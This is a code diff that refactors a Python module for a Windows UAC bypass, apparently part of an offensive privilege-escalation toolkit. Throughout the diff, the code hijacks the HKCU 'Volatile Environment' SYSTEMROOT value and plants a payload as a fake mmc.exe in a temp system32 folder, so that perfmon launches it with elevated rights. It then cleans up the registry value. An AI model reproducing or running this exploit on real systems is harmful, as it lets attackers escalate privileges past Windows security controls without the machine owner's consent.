@@ -10,7 +10,6 @@ perfmon_info = {
 	"Description": "Bypass UAC using perfmon and registry key manipulation",
 	"Id": "7",
 	"Type": "UAC bypass",
-	#"Fixed In": "16299",
 	"Fixed In": "16299" if not information().uac_level() == 4 else "0",
 	"Works From": "7600",
 	"Admin": False,
@@ -21,55 +20,47 @@ perfmon_info = {
 
 def perfmon(payload):
 	if payloads().exe(payload):
-		try:
-			key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join("Volatile Environment"))
-			_winreg.SetValueEx(key, "SYSTEMROOT", 0, _winreg.REG_SZ,tempfile.gettempdir())
-			_winreg.CloseKey(key)
-		except Exception as error:
-			print_error("Unable to create registry keys, exception was raised: {}".format(error))
+		if not os.path.exists(payload):
+			print_error("Args are not allowed with this technique")
 			return False
+
+		path = "Volatile Environment"
+
+		if registry().modify_key(hkey="hkcu", path=path, name="SYSTEMROOT", value=tempfile.gettempdir(), create=True):
+			print_success("Successfully created SYSTEMROOT key containing a new temp directory ({dir})".format(
+							dir=os.path.join(tempfile.gettempdir())))
 		else:
-			print_success("Successfully created SYSTEMROOT key containing a new temp directory ({})".format(
-				os.path.join(tempfile.gettempdir())))
+			print_error("Unable to create registry keys")
+			return False
 
-		try:
-			if os.path.exists(os.path.join(tempfile.gettempdir(), "system32")):
-				if os.path.isfile(os.path.join(tempfile.gettempdir(), "system32\\mmc.exe")):
-					try:
-						os.remove(os.path.join(tempfile.gettempdir(), "system32\\mmc.exe"))
-					except Exception as error:
-						return False
-					try:
-						os.rmdir(os.path.join(tempfile.gettempdir(), "system32"))
-					except Exception as error:
-						return False
-				else:
-					try:
-						os.rmdir(os.path.join(tempfile.gettempdir(), "system32"))
-					except Exception as error:
-						return False
+		if not os.path.exists(os.path.join(tempfile.gettempdir(), "system32")):
+			try:
+				os.makedirs(os.path.join(tempfile.gettempdir(), "system32"))
+			except Exception as error:
+				print_error("Unable to create directory ({tmp_path})".format(tmp_path=os.path.join(tempfile.gettempdir(), "system32")))
+				return False
 			else:
-				pass
-		except Exception as error:
-			return False
-
-		try:
-			os.makedirs(os.path.join(tempfile.gettempdir(), "system32"))
-		except Exception as error:
-			return False
+				print_success("Successfully created directory ({tmp_path})".format(tmp_path=os.path.join(tempfile.gettempdir(), "system32")))
+		else:
+			print_warning("Directory already exists ({tmp_path}) using existing one".format(tmp_path=os.path.join(tempfile.gettempdir(), "system32")))
 
 		time.sleep(5)
 
 		try:
-			if not os.path.exists(payload):
-				print_error('Args are not allowed with this technique.')
-				return False
+			os.remove(os.path.join(tempfile.gettempdir(), "system32\\mmc.exe"))
+		except Exception as error:
+			pass
 
+		try:
 			shutil.copy(payload, os.path.join(tempfile.gettempdir(), "system32\\mmc.exe"))
 		except shutil.Error as error:
+			print_error("Unable to copy payload to directory ({tmp_path})".format(tmp_path=os.path.join(tempfile.gettempdir(), "system32")))
 			return False
 		except IOError as error:
+			print_error("Unable to copy payload to directory ({tmp_path})".format(tmp_path=os.path.join(tempfile.gettempdir(), "system32")))
 			return False
+		else:
+			print_success("Successfully copied payload to directory ({tmp_path})".format(tmp_path=os.path.join(tempfile.gettempdir(), "system32")))
 
 		time.sleep(5)
 
@@ -80,17 +71,15 @@ def perfmon(payload):
 				print_success("Successfully spawned process ({})".format(payload))
 			else:
 				print_error("Unable to spawn process ({})".format(os.path.join(payload)))
-		
+				return False
+
 		time.sleep(5)
-		
-		try:
-			key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, os.path.join("Volatile Environment"))
-			_winreg.DeleteValue(key, "SYSTEMROOT")
-		except Exception as error:
+
+		if registry().remove_key(hkey="hkcu", path=path, name="SYSTEMROOT", delete_key=False):
+			print_success("Successfully cleaned up, enjoy!")
+		else:
 			print_error("Unable to cleanup")
 			return False
-		else:
-			print_success("Successfully cleaned up, enjoy!")
 	else:
 		print_error("Cannot proceed, invalid payload")
 		return False
